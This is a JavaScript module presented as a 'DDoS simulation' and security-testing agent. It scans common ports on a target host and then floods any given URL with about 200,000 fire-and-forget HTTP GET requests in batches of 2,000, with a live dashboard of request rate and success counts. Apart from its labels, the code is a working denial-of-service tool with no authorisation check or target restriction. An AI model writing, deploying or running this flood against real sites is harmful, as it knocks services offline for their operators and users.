const axios = require('axios');
const chalk = require('chalk');
const net = require('net');

/**
 * Crab Bot Agent v4.0 - TURBO ENGINE
 * High-speed DDoS simulation + Security Analysis Agent.
 */

// Port Scanner Tool
async function scanPorts(host) {
    const ports = [80, 443, 8080, 21, 22, 3306];
    const results = [];
    for (const port of ports) {
        const promise = new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(500);
            socket.on('connect', () => { socket.destroy(); resolve({ port, status: 'OPEN' }); });
            socket.on('timeout', () => { socket.destroy(); resolve({ port, status: 'CLOSED' }); });
            socket.on('error', () => { socket.destroy(); resolve({ port, status: 'CLOSED' }); });
            socket.connect(port, host);
        });
        results.push(await promise);
    }
    return results;
}

async function startAttack(targetUrl, options = {}) {
    const { botCount = 30000, payloadType = 'random' } = options;
    const urlObj = new URL(targetUrl);
    const host = urlObj.hostname;

    console.log(chalk.yellow(`\n[🔍] Agent initializing security scan on ${host}...`));
    const openPorts = await scanPorts(host);
    
    let successfulRequests = 0;
    let failedRequests = 0;
    let startTime = Date.now();

    // Turbo Request Function
    const sendTurboRequest = async () => {
        try {
            // Using a more lightweight approach for 100x speed
            await axios.get(targetUrl, {
                headers: { 
                    'User-Agent': 'CrabBot-Agent/4.0 (Turbo; Security-Test)',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive'
                },
                timeout: 1000,
                maxRedirects: 0
            });
            successfulRequests++;
        } catch (error) {
            failedRequests++;
        }
    };

    const displayDashboard = (progress) => {
        const total = successfulRequests + failedRequests;
        const successRate = total > 0 ? ((successfulRequests / total) * 100).toFixed(2) : 0;
        const duration = ((Date.now() - startTime) / 1000).toFixed(1);
        
        let securityLevel = successRate > 70 ? "CRITICAL" : (successRate > 30 ? "STABLE" : "ELITE");
        let color = successRate > 70 ? chalk.red : (successRate > 30 ? chalk.yellow : chalk.green);

        process.stdout.write('\x1Bc'); // Clear
        console.log(chalk.red.bold(`
    ██████╗██████╗  █████╗ ██████╗     ██████╗  ██████╗ ████████╗
    ██╔════╝██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔═══██╗╚══██╔══╝
    ██║     ██████╔╝███████║██████╔╝    ██████╔╝██║   ██║   ██║   
    ██║     ██╔══██╗██╔══██║██╔══██╗    ██╔══██╗██║   ██║   ██║   
    ╚██████╗██║  ██║██║  ██║██████╔╝    ██████╔╝╚██████╔╝   ██║   
     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═════╝  ╚═════╝    ╚═╝   
    [ AGENT TRACK DDoS TEST - CYBER SECURITY PLATFORM v4.0 ]
        `));
        
        console.log(chalk.white(`    Target: `) + chalk.cyan(targetUrl));
        console.log(chalk.white(`    Ports:  `) + openPorts.filter(p => p.status === 'OPEN').map(p => chalk.green(p.port)).join(', '));
        console.log(`    ──────────────────────────────────────────────────────────`);
        console.log(chalk.green(`    [✔] Success: `) + chalk.bold(successfulRequests.toLocaleString()) + chalk.red(`  [✘] Blocked: `) + chalk.bold(failedRequests.toLocaleString()));
        console.log(chalk.magenta(`    [⚡] Speed:   `) + chalk.bold(`${((total/duration) || 0).toFixed(0)} req/s`));
        console.log(chalk.yellow(`    [🛡] Defense: `) + color.bold(securityLevel));
        console.log(`    ──────────────────────────────────────────────────────────`);
        console.log(`    Progress: [${'#'.repeat(Math.floor(progress/5))}${' '.repeat(20-Math.floor(progress/5))}] ${progress}%`);
    };

    // Extreme Speed Execution
    const totalCycles = 100;
    const batchSize = 2000; // Massive batches for 100x speed

    for (let i = 0; i <= totalCycles; i++) {
        const batch = Array.from({ length: batchSize }, () => sendTurboRequest());
        Promise.allSettled(batch); // Fire and forget for max speed
        displayDashboard(i);
        await new Promise(r => setTimeout(r, 100));
    }

    console.log(chalk.green.bold(`\n\n[✓] Agent Mission Accomplished. Final Report Generated.`));
}

module.exports = { startAttack };
